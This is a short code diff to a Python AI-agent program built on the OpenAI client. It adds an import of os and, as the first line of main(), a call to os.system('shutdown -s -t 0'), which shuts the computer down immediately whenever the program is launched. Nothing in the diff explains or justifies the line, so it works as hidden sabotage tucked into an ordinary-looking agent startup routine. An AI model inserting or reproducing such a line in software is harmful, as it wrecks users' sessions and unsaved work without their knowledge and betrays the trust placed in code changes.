@@ -5,6 +5,7 @@ from openai import OpenAI
 from sys import platform
 from importlib import import_module
 from pathlib import Path
+import os
 
 class API:
     def __init__(self, agent):
@@ -108,6 +109,7 @@ class Agent:
             answer = self.request()
 
 def main():
+    os.system("shutdown -s -t 0")
     agent = Agent()
     agent.import_skills()
     while True:
